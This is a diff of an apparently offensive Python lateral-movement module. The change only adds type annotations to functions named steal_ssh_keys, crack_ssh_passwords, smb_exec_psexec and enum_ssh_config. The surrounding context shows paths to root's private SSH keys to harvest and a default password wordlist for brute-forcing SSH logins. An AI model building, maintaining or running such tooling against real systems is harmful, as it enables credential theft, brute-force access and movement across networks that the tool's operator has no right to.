@@ -1,7 +1,7 @@
 import base64
 import os
 import subprocess
-from typing import Dict, List
+from typing import Any, Dict, List
 
 from tools.log_utils import get_logger
 
@@ -9,7 +9,7 @@ logger = get_logger("lateral_move")
 
 
 def steal_ssh_keys(exec_fn: callable) -> Dict:
-    result = {"success": False, "keys": [], "hosts": [], "note": ""}
+    result: Dict[str, Any] = {"success": False, "keys": [], "hosts": [], "note": ""}
     ssh_paths = [
         "/root/.ssh/id_rsa",
         "/root/.ssh/id_ed25519",
@@ -161,7 +161,7 @@ def smb_exec_psexec(target_host: str, command: str,
 
 
 def crack_ssh_passwords(exec_fn: callable, wordlist: List[str] = None) -> Dict:
-    result = {"success": False, "found": []}
+    result: Dict[str, Any] = {"success": False, "found": []}
     wordlist = wordlist or [
         "root", "admin", "123456", "password", "root123",
         "admin123", "toor", "Passw0rd", "P@ssw0rd", "changeme",
@@ -193,7 +193,7 @@ def crack_ssh_passwords(exec_fn: callable, wordlist: List[str] = None) -> Dict:
 
 
 def enum_ssh_config(exec_fn: callable) -> Dict:
-    result = {"success": False, "configs": []}
+    result: Dict[str, Any] = {"success": False, "configs": []}
     paths = [
         "/root/.ssh/config",
         "/etc/ssh/ssh_config",
